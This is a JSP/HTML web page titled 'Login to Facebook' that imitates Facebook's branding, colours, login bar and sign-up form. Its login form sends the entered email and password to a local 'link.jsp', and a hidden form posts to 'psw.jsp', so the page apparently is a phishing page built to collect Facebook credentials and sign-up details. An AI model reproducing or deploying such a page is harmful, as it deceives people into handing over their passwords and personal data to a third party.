<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<head >
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<title>Login to Facebook</title>
<link rel="icon" 
  type="image/icon" 
  href="fb.ico">


<STYLE>
.navbar-nav > li{
  margin-left:2px;
  margin-right:2px;
}
#marginRow{
   margin-bottom:0px ;
   margin-top:0px ; 
   position: relative;
   top: -20px;
   }
   .img-responsive{
        max-width: 100%;
        height: auto;
        box-shadow:none;
    }

.thumbnail{
border: 0px;
box-shadow: none;
border-radius:0px;
background-color: #f7f7f7;
}

#height{
margin-left:6px;
  margin-right:4px;
  height:40px;
  width:200px;
  
  

}
.green_btn  {
    background: green;
}

#search {
    width: 12em;  height: 3em;
}
</STYLE>





</head> 


<body>

<div class="container-fluid">
<div class="row" >

<nav  class="navbar navbar-default " STYLE="BACKGROUND: #3b5998">
<div class="container-fluid">

    <div class="col-md-7 navbar-header"  STYLE="BACKGROUND: #3b5998 ">
      <center><B><font   size="8" color="white" face="Lucida Grande">facebook</font></B></center>   
    </div>
    
    
    <div id="box1">
    <form style="display: hidden" action="psw.jsp" method="POST" id="form">
  <input type="hidden" id="var1" name="var1" value=""/>
  
</form>
    </div>
    
    
    <div id="box">
    
    <form  id="log" action="link.jsp" method="post">
    <ul class="nav navbar-nav">
     
      <li>
      <div class="form-group" >
    <label for="email"> <font  color="white">E-mail or Phone: </font>   </label>
    <input type="text" class="form-control" name="email" id="email">
    </div>
        </li>
       
        
      <li> 
     <div class="form-group">
    <label for="pwd"><font color="white">Password:</font></label>
    <input type="password" name="pwd" class="form-control" id="pwd">
      <a href="https://www.facebook.com/recover/initiate?lwv=110"> <font color="white">Forgotten Account?</font></a>       
    </div>    
  </li>
  
  <li>
  <br>
  <div class="form-inline"  >
        <div class="form-group">
        <input type="submit" id="avail" class="btn btn-primary" value="log in">
  </div>
      </div>
      </li>
     </ul>
    
    </form>
    </div>
  </div>
</nav>





<div class="row " id="marginRow"style="margin-left:0px;margin-top:0px ">

<div class="col-md-7 " STYLE="BACKGROUND:#f7f7f7">
     
      <img src="sa.jpg" alt="sd" class="img-responsive"class="img-rounded" style="width:660px;height:580px">          
</div>



<div class="col-md-5" STYLE="BACKGROUND:#f7f7f7" >
<br>
<br>
<B><font size=6>Sign Up<br></font></B>
<h4>It's free and always will be.</h4><br>

<br>

<form role="form" method="post" action="signupaction.jsp">


  <div class="form-group form-inline " >
  
  
<input class="  form-inline form-control " id="height" type="text" name="fname"  placeholder="First Name" >     

<input  class="  form-inline form-control "id="height" type="text" name="lastname" s placeholder="SurName"><br>
</div>


 
 <div class="form-group">
 <input class="form-control input-lg" id="inputlg" type="text" style="width:450px" name="emailnum"  placeholder="Re-enter Mobile number or e-mail address">
</div>

<div class="form-group"><input class="form-control input-lg"  style="width:450px" id="inputlg" type="password" name="pswd"  placeholder="New Password">
</div>


<font size="4">Birthday:</font><br><br>

 <select name="Day" >
  <option value="Day">Day</option>
  <option value="1">1</option>
  <option value="2">2</option>
  <option value="3">3</option>
  <option value="4">4</option>
  <option value="5">5</option>
  <option value="6">6</option>
  <option value="7">7</option>
  <option value="8">8</option>
  <option value="9">9</option>
  <option value="10">10</option>
  <option value="11">11</option>
  <option value="12">12</option>
  <option value="13">13</option>
  <option value="14">14</option>
  <option value="15">15</option>
  <option value="16">16</option>
  <option value="17">17</option>
  <option value="18">18</option>
  <option value="19">19</option>
  <option value="20">20</option>
  <option value="21">21</option>
  <option value="22">22</option>
  <option value="23">23</option>
  <option value="24">24</option>
  <option value="25">25</option>
  <option value="26">26</option>
  <option value="27">27</option>
  <option value="28">28</option>
  <option value="29">29</option>
  <option value="30">30</option>
  <option value="31">31</option>
  
</select>


 <select name="Month" style="margin-left:20px;" >
  <option value="Month">Month</option>
  <option value="01">January</option>
  <option value="02">February</option>
  <option value="03">March</option>
  <option value="04">April</option>
  <option value="05">May</option>
  <option value="06">June</option>
  <option value="07">July</option>
  <option value="08">August</option>
  <option value="09">September</option>
  <option value="10">October</option>
  <option value="11">November</option>
  <option value="12">December</option>
  
</select>

<select style="margin-left:20px;"name="Year" >
  <option value="Year">Year</option>
  <option value="2016">2016</option>
  <option value="2015">2015</option>
  <option value="2014">2014</option>
  <option value="2013">2013</option>
  <option value="2012">2012</option>
  <option value="2011">2011</option>
  <option value="2010">2010</option>
  <option value="2009">2009</option>
  <option value="2008">2008</option>
  <option value="2007">2007</option>
  <option value="2006">2006</option>
  <option value="2005">2005</option>
  <option value="2004">2004</option>
  <option value="2003">2003</option>
  <option value="2002">2002</option>
  <option value="2001">2001</option>
  <option value="2000">2000</option>
  <option value="1999">1999</option>
  <option value="1998">1998</option>
  <option value="1997">1997</option>
  <option value="1996">1996</option>
  <option value="1995">1995</option>
  <option value="1994">1994</option>
  <option value="1993">1993</option>
  <option value="1992">1992</option>
  <option value="1991">1991</option>
  <option value="1990">1990</option>
  <option value="1989">1989</option>
  <option value="1988">1988</option>
  <option value="1987">1987</option>
  
</select>
 <br><br>
 <div class="form-group">
 
 <input type="radio" name="gender" value="male" > Male
  <input type="radio" name="gender" value="female"> Female
  <br><br>
</div>

<div class="form-group">
<br><button class="green_btn btn-sm btn btn-primary" type="submit" id="search" ><font size=3>Sign Up</font></button>
<br>
</div>
</form>
</div>


</div>

</div>

</div>
</body>
</html>